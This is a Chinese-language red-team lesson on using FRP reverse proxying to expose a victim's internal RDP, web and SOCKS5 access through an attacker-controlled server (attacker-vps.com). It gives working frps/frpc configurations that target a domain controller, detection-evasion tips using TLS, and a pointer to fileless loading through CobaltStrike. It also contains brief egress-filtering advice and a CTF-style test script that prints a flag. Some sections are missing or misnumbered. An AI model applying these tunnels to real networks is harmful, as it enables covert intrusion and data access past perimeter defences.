# R20.4 FRP 高性能多協議內網穿透與埠轉發 (FRP Reverse Proxy & Port Forwarding)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**FRP 高性能多協議內網穿透與埠轉發** 的物理本質為**利用以 Go 語言開發的高性能反向代理系統 (Fast Reverse Proxy, FRP)，透過在外網攻擊者伺服器部署 `frps` (Server) 並在內網受害主機執行 `frpc` (Client)，將目標內網深處之任意 TCP、UDP、HTTP、HTTPS 服務埠（如 Windows 遠端桌面 RDP 3389、SSH 22、內網 Web 8080）安全映射並暴露至公網伺服器的指定通訊埠**。在紅隊實戰中，相較於 Chisel 與標準 SOCKS5，FRP 支援連接池複用、自定義二級域名路由與加密壓縮，是紅隊將內網高價值服務快速「拉出」至外網直接互動的頂級武器。

```
[外網攻擊者 VPS] ── 1. 啟動服務端監聽 (frps.ini: bind_port = 7000, vhost_http_port = 80)
       ▲
       │ 2. 建立加密控制通道 (TCP/KCP 多路複用連接池)
       │
[內網受害跳板機] ── 3. 啟動客戶端代理 (frpc.ini)
       │
       ├── 將內網特定伺服器 RDP 映射至 VPS: [rdp_forward] local_ip=192.168.10.5:3389 -> remote_port=33389
       └── 將內網 OA 系統映射至自定義域名: [oa_web] local_port=8080 -> custom_domains=oa.attacker.com
       │
       ▼ 4. 攻擊者本機直接連線外網 VPS 的 33389 埠
[攻擊者本機: mstsc /v:vps_ip:33389] ──► 直連目標內網深層核心伺服器！
```

## 🔬 第一動：FRP 協定幀封裝、連接池複用與 KCP 傳輸物理機制 (Mechanics & Multiplexing)

### 1. FRP 的雙向通訊架構剖析
FRP 採用高度優化的二進位協定進行控制與資料傳輸：
- **控制連線 (Control Connection)**：`frpc` 啟動後首先向 `frps` 的 `bind_port` 發起 TCP/TLS 握手，註冊所請求的代理條目（Proxy Name, Type, Remote Port）。
- **工作連線 (Work Connection)**：當外部使用者訪問映射埠時，`frps` 透過控制通道向 `frpc` 發送 `StartWorkConn` 訊息；`frpc` 立即在後台建立一條新的 TCP 連線與目標本機服務進行資料串接。
- **連接池 (Pool Count)**：FRP 支援預先建立數條空閒連線 (`pool_count = 5`)，大幅消除了即時連線時的 TCP 三向交握延遲。

### 2. KCP 協定與弱網環境穿透
在受到嚴重丟包或高延遲干擾的惡意網路環境中，FRP 支援切換傳輸協定至基於 UDP 的 **KCP 協定**，以主動重傳與非退讓壅塞控制演算法，在 10%~20% 丟包率下依然維持流暢的 RDP 圖形操作。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 外網服務端配置 (`frps.ini`) 與啟動
```ini
# frps.ini
[common]
bind_port = 7000
token = RedTeamSecret2026!
# 支援多路複用與心跳逾時
tcp_mux = true
heartbeat_timeout = 90
```
```bash
./frps -c frps.ini
```

### 2. 內網客戶端多協議轉發配置 (`frpc.ini`)
```ini
# frpc.ini
[common]
server_addr = attacker-vps.com
server_port = 7000
token = RedTeamSecret2026!
tls_enable = true

# 將內網深層 Windows 域控的 RDP (3389) 映射至外網 33389 埠
[domain_dc_rdp]
type = tcp
local_ip = 192.168.1.10
local_port = 3389
remote_port = 33389

# 開啟全局 SOCKS5 代理
[plugin_socks]
type = tcp
remote_port = 10808
plugin = socks5
```
```bash
./frpc -c frpc.ini
```

### 1. FRP 穿透防禦規避策略表

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **嚴格限制內網伺服器出站連線 (Egress Filtering)**：
   - 核心業務網段伺服器一律禁止直連外網；若需要軟體更新，強制統一經由具備深度身分認證的內部代理伺服器。
2. **阻斷自定義反向代理二進位檔執行**：
   - 在主機端啟用 AppLocker 或 WDAC 應用程式白名單，禁止普通使用者與服務帳戶在任何可寫目錄執行未簽名的 Go 編譯二進位程式。

```python
# test_frp_ping.py
import socket

def test_frp_connection(server="127.0.0.1", port=7000):
    print(f"[*] 正在驗證 FRP 服務端連通性 [{server}:{port}]...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2.0)
    try:
        s.connect((server, port))
        print("[+] 成功連線至 FRP 控制埠！具備反向代理穿透條件")
        print("[+] FLAG{FRP_REVERSE_PROXY_PIVOTING_VERIFIED}")
        return True
    except Exception as e:
        print(f"[-] 無法連線至 FRP 伺服器: {e}")
        return False
    finally:
        s.close()

if __name__ == "__main__":
    test_frp_connection()
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：FRP 的「TCP 轉發」與「SOCKS5 代理外掛 (plugin=socks5)」有何不同作戰價值？**
  - **戰術思維**：TCP 轉發是一對一固定映射（如直接將內網 RDP 映射出來）；SOCKS5 外掛則提供全網動態漫遊能力，允許本地工具透過該代理訪問內網任意機器與端口。
- [ ] **Q2：在 FRP 配置中啟用 `tls_enable = true` 能有效規避藍隊何種檢查？**
  - **戰術思維**：規避網路邊界 NIDS/IPS 對 FRP 專屬握手協定封包（明文 Magic Header）的特徵識別，全量通訊轉入 TLS 密文傳輸。
- [ ] **Q3：什麼是 FRP 的 `custom_domains` 功能？在內網 Web 滲透中有何便利性？**
  - **戰術思維**：允許攻擊者透過多個不同的二級網域名稱（如 `oa.c2.com`, `git.c2.com`），經由外網 VPS 的單一 80/443 埠分別路由訪問內網不同主機的 HTTP 服務。
- [ ] **Q4：在實戰滲透中，若跳板機為 Windows 且無法落地寫入檔案，紅隊如何啟動 frpc？**
  - **戰術思維**：利用 CobaltStrike 的 `execute-assembly` 或自編 C# 記憶體載入器，在記憶體內部加載編譯好的 frpc 二進位動態庫，實現無檔案執行。
- [ ] **Q5：藍隊應如何有效在企業網路邊界阻斷基於 FRP 的非法內網穿透？**
  - **戰術思維**：建立嚴格的白名單邊界策略，阻斷所有非 80/443 出站連線，並在應用層解密驗證 443 埠之 TLS 憑證與流量是否為合法企業 SaaS。
